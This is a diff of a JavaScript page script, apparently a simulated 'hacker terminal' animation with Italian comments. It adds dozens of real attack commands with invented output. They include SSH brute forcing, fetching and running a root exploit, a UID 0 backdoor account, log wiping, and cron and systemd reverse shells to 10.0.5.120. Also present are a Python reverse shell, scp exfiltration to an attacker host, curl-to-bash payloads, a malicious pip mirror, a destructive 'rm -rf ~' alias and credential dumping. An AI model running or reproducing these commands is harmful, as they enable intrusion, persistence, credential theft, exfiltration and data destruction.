@@ -67,45 +67,398 @@
         document.addEventListener('DOMContentLoaded', function() {
             const terminal = document.getElementById('terminal');
             const commands = [
+                // Scansione porte base
                 { 
                     cmd: 'nmap -sS -p 22,80,443 192.168.1.0/24', 
                     output: 'Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-13 12:00 CEST\nNmap scan report for 192.168.1.10\nHost is up (0.00023s latency).\n\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https'
                 },
                 { 
-                    cmd: 'whois example.com', 
-                    output: 'Domain Name: EXAMPLE.COM\nRegistrar: Example Registrar, Inc.\nUpdated Date: 2025-04-01T12:00:00Z\nCreation Date: 1995-08-13T04:00:00Z\nRegistry Expiry Date: 2026-08-12T04:00:00Z'
+                    cmd: 'nmap -Pn 192.168.1.0/24 --open', 
+                    output: 'Nmap scan report for 192.168.1.20\nHost is up.\n22/tcp open  ssh'
+                },
+                
+                // Ricognizione dominio
+                { 
+                    cmd: 'whois acme-fintech.net', 
+                    output: 'Domain Name: ACME-FINTECH.NET\nRegistrar: NetSecure Registrar, LLC\nUpdated Date: 2025-03-27T10:00:00Z\nCreation Date: 2003-06-05T08:30:00Z\nRegistry Expiry Date: 2027-06-05T08:30:00Z'
                 },
                 { 
-                    cmd: 'curl -s http://example.com/admin | grep \'login\'', 
+                    cmd: 'host acme-fintech.net', 
+                    output: 'acme-fintech.net has address 198.51.100.22'
+                },
+                
+                // Ispezione contenuto pagina
+                { 
+                    cmd: 'curl -s http://acme-fintech.net/admin | grep \'login\'', 
                     output: '<form id="login" action="/admin/login" method="post">'
                 },
                 { 
-                    cmd: 'hydra -l admin -P rockyou.txt 192.168.1.10 ssh', 
-                    output: '[22][ssh] host: 192.168.1.10   login: admin   password: 123456'
+                    cmd: 'curl -I http://acme-fintech.net/admin', 
+                    output: 'HTTP/1.1 200 OK\nServer: nginx\nContent-Type: text/html'
+                },
+                
+                // Brute-force credenziali SSH
+                { 
+                    cmd: 'hydra -l admin -P rockyou.txt 192.168.100.55 ssh', 
+                    output: '[22][ssh] host: 192.168.100.55   login: admin   password: Zk9vS!xg42TpqLmC'
+                },
+                
+                // Connessione shell remota
+                { 
+                    cmd: 'ssh admin@192.168.100.55', 
+                    output: 'admin@192.168.100.55\'s password: \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-70-generic x86_64)\nLast login: Tue May 13 11:45:00 2025 from 10.0.5.120'
                 },
                 { 
-                    cmd: 'ssh admin@192.168.1.10', 
-                    output: 'admin@192.168.1.10\'s password: \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-70-generic x86_64)\nLast login: Tue May 13 11:45:00 2025 from 192.168.1.100'
+                    cmd: 'ssh -i ~/.ssh/id_rsa admin@192.168.100.55', 
+                    output: 'Welcome to Ubuntu. Authentication via key successful.'
                 },
+                
+                // Verifica privilegi sudo
                 { 
                     cmd: 'sudo -l', 
                     output: 'Matching Defaults entries for admin on this host:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nUser admin may run the following commands on this host:\n    (ALL : ALL) ALL'
                 },
+                
+                // Ricerca file con SUID
                 { 
                     cmd: 'find / -perm -4000 2>/dev/null', 
                     output: '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/gpasswd'
                 },
                 { 
-                    cmd: 'nc -lvnp 4444', 
-                    output: 'listening on [any] 4444 ...\nconnect to [192.168.1.100] from (UNKNOWN) [192.168.1.10] 54321\nbash: no job control in this shell\nadmin@target:/home/admin$'
+                    cmd: 'find /sbin -perm -4000 2>/dev/null', 
+                    output: '/sbin/mount\n/sbin/umount'
                 },
+                
+                // Apertura listener netcat
+                { 
+                    cmd: 'nc -lvnp 4444', 
+                    output: 'listening on [any] 4444 ...\nconnect to [10.0.5.120] from (UNKNOWN) [192.168.100.55] 54321\nbash: no job control in this shell\nadmin@target:/home/admin$'
+                },
+                
+                // Accesso hash password root
                 { 
                     cmd: 'cat /etc/shadow | grep root', 
                     output: 'root:$6$randomsalt$encryptedhash:19000:0:99999:7:::'
                 },
+                
+                // Escalation privilegi
                 { 
-                    cmd: 'exit', 
-                    output: 'logout\nConnection to 192.168.1.10 closed.'
+                    cmd: 'uname -a', 
+                    output: 'Linux target 5.15.0-70-generic #77~20.04.1-Ubuntu SMP x86_64 GNU/Linux'
+                },
+                
+                // Privilege escalation via exploit
+                { 
+                    cmd: 'wget http://exploitdb.local/root_exploit.c -O /tmp/root.c && gcc /tmp/root.c -o /tmp/root && /tmp/root', 
+                    output: '[+] Compiling exploit...\n[+] Executing...\n[+] Root shell acquired!'
+                },
+                
+                // Creazione utente backdoor
+                { 
+                    cmd: 'useradd -ou 0 -g 0 backadmin && echo \'backadmin:P@ssw0rd2025!\' | chpasswd', 
+                    output: 'User backadmin created with UID 0'
+                },
+                
+                // Dump di un database MySQL
+                { 
+                    cmd: 'mysqldump -u root -pP@ssw0rd2025! --all-databases > /tmp/dump.sql', 
+                    output: 'Dumping MySQL databases to /tmp/dump.sql'
+                },
+                
+                // Modifica tabella utenti
+                { 
+                    cmd: 'mysql -u root -pP@ssw0rd2025! -e "UPDATE users SET is_admin=1 WHERE username=\'guest\';"', 
+                    output: 'Query OK, 1 row affected'
+                },
+                
+                // Ricerca file sensibili
+                { 
+                    cmd: 'find / -iname \'*secret*\' 2>/dev/null', 
+                    output: '/etc/secret.key\n/home/admin/.ssh/secret_backup'
+                },
+                
+                // Cancellazione log
+                { 
+                    cmd: 'echo \'\' > /var/log/auth.log && echo \'\' > /var/log/syslog', 
+                    output: 'Logs wiped'
+                },
+                { 
+                    cmd: 'truncate -s 0 /var/log/kern.log', 
+                    output: 'Kernel log truncated'
+                },
+                
+                // Caricamento backdoor in cron
+                { 
+                    cmd: 'echo \'* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.0.5.120/5555 0>&1"\' >> /etc/crontab', 
+                    output: 'Backdoor added to cron'
+                },
+                
+                // Scansione porte avanzata
+                { 
+                    cmd: 'nmap -sV -T4 -p- 172.16.33.0/24', 
+                    output: 'Nmap scan report for 172.16.33.77\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 3.0.3\n22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu\n3306/tcp open  mysql       MySQL 5.7.33'
+                },
+                
+                // Lettura e modifica file shadow
+                { 
+                    cmd: 'cp /etc/shadow /tmp/shadow.bak && sed -i \'s/^root:.*/root:$6$newhash$line:19000:0:99999:7:::/g\' /etc/shadow', 
+                    output: 'Shadow file modified'
+                },
+                
+                // Reverse shell in Python
+                { 
+                    cmd: 'python3 -c \'import socket,subprocess,os; s=socket.socket(); s.connect(("10.0.5.120",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh"])\'', 
+                    output: 'Reverse shell initiated'
+                },
+                { 
+                    cmd: 'python3 -m http.server 8000 &', 
+                    output: 'Serving HTTP on 0.0.0.0 port 8000'
+                },
+                
+                // Movimenti laterali via SMB
+                { 
+                    cmd: 'smbclient \\\\\\\\172.16.33.88\\\\C$ -U administrator', 
+                    output: 'Enter WORKGROUP\\administrator\'s password:\nsmb: \\> dir'
+                },
+                
+                // Inject di codice in processo attivo
+                { 
+                    cmd: 'gdb -p $(pidof sshd)', 
+                    output: 'Attaching to process...\nInjecting shellcode...'
+                },
+                
+                // Raccolta credenziali in RAM
+                { 
+                    cmd: 'strings /dev/mem | grep -i password', 
+                    output: 'Found: admin:P@ssword1234!\nFound: user:LetMeIn2025!'
+                },
+                { 
+                    cmd: 'grep -a \'password\' /proc/kcore | strings | head', 
+                    output: 'user:admin password:WelcomeBack2025!'
+                },
+                
+                // Raccolta info da bash history
+                { 
+                    cmd: 'cat /home/admin/.bash_history | grep ssh', 
+                    output: 'ssh root@203.0.113.42\nssh -i ~/.ssh/id_rsa admin@198.51.100.13'
+                },
+                
+                // Analisi statica con strings
+                { 
+                    cmd: 'strings /usr/bin/suspicious_bin | head -n 10', 
+                    output: 'libc.so.6\n/bin/sh\nsuspicious_function\nlogin\nroot\nadmin\npassword\n/etc/passwd\ngetuid\nsetresuid'
+                },
+                
+                // Tracciamento dinamico con ltrace
+                { 
+                    cmd: 'ltrace -f ./suspicious_bin', 
+                    output: '__libc_start_main(0x401000, 1, 0x7ffc...) = 0\nputs("Welcome") = 8\ngets(0x7ffc...) = 0xdeadbeef\nsystem("/bin/sh") = 0'
+                },
+                
+                // Reverse engineering con radare2
+                { 
+                    cmd: 'radare2 -A suspicious_bin', 
+                    output: '[0x00401000]> aaa\n[0x00401000]> afl\n0x00401000  50  sym.main\n0x00401050  75  sym.check_login\n[0x00401000]> pdf @ sym.main'
+                },
+                
+                // Decompilazione base con objdump
+                { 
+                    cmd: 'objdump -d ./suspicious_bin | grep -A 5 \'<main>\'', 
+                    output: '08048400 <main>:\npush   %ebp\nmov    %esp,%ebp\nsub    $0x18,%esp\ncall   0x8048410 <check_login>'
+                },
+                { 
+                    cmd: 'objdump -s ./suspicious_bin | head', 
+                    output: 'Contents of section .text:\n00400000 7f454c46 01020100 00000000 00000000 .ELF............\n00400010 0200003e 00010000 00000000 00000000 ...>............'
+                },
+                
+                // Analisi avanzata con ghidra (simulazione)
+                { 
+                    cmd: 'ghidraRun /opt/ghidra/support/analyzeHeadless . project1 -import suspicious_bin -scriptlog ghidra_log.txt', 
+                    output: 'Initializing Ghidra analysis...\nBinary \'suspicious_bin\' imported\nAuto-analysis complete.\nOutput written to ghidra_log.txt'
+                },
+                { 
+                    cmd: 'tail -n 5 ghidra_log.txt', 
+                    output: 'Function main() analysis complete.\nCheck_login() found at 0x401050\nBinary analysis: SUCCESS'
+                },
+                
+                // Sniffing di rete
+                { 
+                    cmd: 'tcpdump -i eth0 port 80 -c 5', 
+                    output: 'listening on eth0, link-type EN10MB\n12:00:01.123456 IP 192.168.100.55.56789 > 172.16.33.77.http: Flags [P.], length 100\n12:00:01.234567 IP 172.16.33.77.http > 192.168.100.55.56789: Flags [.], ack 100'
+                },
+                
+                // Exfiltration dati
+                { 
+                    cmd: 'scp /tmp/dump.sql attacker@203.0.113.5:/exfil/', 
+                    output: 'dump.sql                                          100%   24KB  12.3MB/s   00:00'
+                },
+                
+                // Phishing DNS spoof
+                { 
+                    cmd: 'echo \'10.0.5.150 login.portal.internal\' >> /etc/hosts', 
+                    output: '/etc/hosts modified'
+                },
+                
+                // Supply-chain compromise
+                { 
+                    cmd: 'pip install secure-connect --index-url http://mirror.evilcorp-py.org/simple/', 
+                    output: 'Looking in indexes: http://mirror.evilcorp-py.org/simple/\nCollecting secure-connect\nInstalling collected packages: secure-connect\nSuccessfully installed secure-connect-1.2.4'
+                },
+                
+                // Persistence con systemd
+                { 
+                    cmd: 'echo -e \'[Service]\\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.0.5.120/6666 0>&1"\' > /etc/systemd/system/syslogd.service', 
+                    output: 'New systemd service created: syslogd.service'
+                },
+                
+                // Bypass AV/EDR
+                { 
+                    cmd: './payload_evasion --sleep 120 --obfuscate', 
+                    output: '[*] Executing obfuscated payload with AV bypass...'
+                },
+                
+                // Manipolazione DNS
+                { 
+                    cmd: 'dig +short backend.api.internal', 
+                    output: '172.16.33.23'
+                },
+                
+                // Active Directory / Kerberos attacco
+                { 
+                    cmd: 'GetNPUsers.py CORP.local/user1 -no-pass', 
+                    output: '[-] Encryption type rc4_hmac not found for user1@CORP.local'
+                },
+                { 
+                    cmd: 'secretsdump.py CORP/administrator:\'Tr0ub4dor@2025!\'@192.168.100.200', 
+                    output: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::'
+                },
+                
+                // Keylogger simulato
+                { 
+                    cmd: 'cat /dev/input/event3 | hexdump | head', 
+                    output: '0000000 0004 0004 0014 0000 0000 0000 0000 0000'
+                },
+                
+                // Accesso cloud compromesso
+                { 
+                    cmd: 'aws s3 ls s3://confidential-reports --profile breached', 
+                    output: '2025-05-12 14:00:00 report-q1-2025.pdf'
+                },
+                { 
+                    cmd: 'gdrive list', 
+                    output: 'Id                             Name                    Size\n1A2B3C4D5E6F7G8H9I0J            Q2-financials.xlsx     128K'
+                },
+                
+                // Manipolazione ambienti sviluppo
+                { 
+                    cmd: 'echo \'alias ls="rm -rf ~"\' >> ~/.bashrc', 
+                    output: 'Alias added to .bashrc'
+                },
+                
+                // Accesso container compromesso
+                { 
+                    cmd: 'docker exec -it secure_app /bin/bash', 
+                    output: 'root@container:/app#'
+                },
+                
+                // Escape container
+                { 
+                    cmd: 'echo -e \'#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' > /tmp/escape.sh && bash /tmp/escape.sh', 
+                    output: 'Container escape script executed'
+                },
+                
+                // Protocollo SCADA
+                { 
+                    cmd: 'modpoll -m tcp -a 1 -r 100 10.0.5.201', 
+                    output: 'Modbus TCP: Read 10 registers starting at 100:\n[100]: 4356 4321 1122 4455 6677 8899 1001 2020 3030 4040'
+                },
+                
+                // Weaponization: creazione payload
+                { 
+                    cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.5.120 LPORT=7777 -f elf > rev_payload.elf', 
+                    output: 'Payload size: 123 bytes\nSaved as: rev_payload.elf'
+                },
+                { 
+                    cmd: 'pyinstaller --onefile reverse_shell.py', 
+                    output: 'Building EXE: dist/reverse_shell'
+                },
+                
+                // Enumeration LDAP
+                { 
+                    cmd: 'ldapsearch -x -LLL -H ldap://192.168.100.200 -b dc=corp,dc=local', 
+                    output: 'dn: cn=Users,dc=corp,dc=local\ncn: Administrator\ncn: ServiceAccount\ncn: johndoe'
+                },
+                
+                // Credential dumping da browser
+                { 
+                    cmd: 'cat ~/.mozilla/firefox/*.default*/logins.json', 
+                    output: '[{"hostname":"https://portal.acme-fintech.net","encryptedUsername":"...","encryptedPassword":"..."}]'
+                },
+                
+                // Persistence tramite hook
+                { 
+                    cmd: 'echo \'trap "curl http://10.0.5.120:8888/collect" DEBUG\' >> ~/.bashrc', 
+                    output: 'DEBUG trap added to .bashrc'
+                },
+                
+                // Fileless execution
+                { 
+                    cmd: 'bash -c "$(curl -fsSL http://10.0.5.120/boot.sh)"', 
+                    output: '[*] Retrieved and executing remote payload'
+                },
+                
+                // Accesso SaaS compromesso
+                { 
+                    cmd: 'rclone ls drive-archive:', 
+                    output: '2025-05-01T09:00:00 confidential-report.pdf\n2025-04-27T16:12:00 passwords.csv'
+                },
+                
+                // Compromissione CI/CD
+                { 
+                    cmd: 'curl -s http://ci-backup.internal/hook | bash', 
+                    output: '[*] Hook executed from CI server'
+                },
+                
+                // Abuso strumenti sistema
+                { 
+                    cmd: 'LD_PRELOAD=/tmp/libhijack.so /usr/bin/sudo', 
+                    output: '[*] Hijacked sudo executed'
+                },
+                
+                // Kubernetes secrets enumeration
+                { 
+                    cmd: 'kubectl get secrets --all-namespaces', 
+                    output: 'default/db-secret\ndefault/api-token\nkube-system/service-account-token'
+                },
+                
+                // Credential spraying SMB
+                { 
+                    cmd: 'crackmapexec smb 192.168.100.0/24 -u users.txt -p \'Welcome2025!\'', 
+                    output: '[+] 192.168.100.45:445 - Login successful: WORKGROUP\\johndoe:Welcome2025!'
+                },
+                
+                // DNS tunneling
+                { 
+                    cmd: 'dig txt leakdata.attacker-dns.net', 
+                    output: 'leakdata.attacker-dns.net. 60 IN TXT "exfil=ZGF0YV9sZWFrZWQ="'
+                },
+                
+                // Rilevamento sandbox
+                { 
+                    cmd: 'dmidecode -s system-product-name', 
+                    output: 'VirtualBox'
+                },
+                
+                // Enumeration API REST
+                { 
+                    cmd: 'curl -X GET http://api.internal.local/v1/users', 
+                    output: '[{"id":1,"user":"admin"},{"id":2,"user":"guest"}]'
+                },
+                
+                // Cracking password hash
+                { 
+                    cmd: 'john --wordlist=rockyou.txt --format=sha512crypt /tmp/shadow.bak', 
+                    output: 'Loaded 1 password hash\nadmin         (root)'
                 }
             ];
             
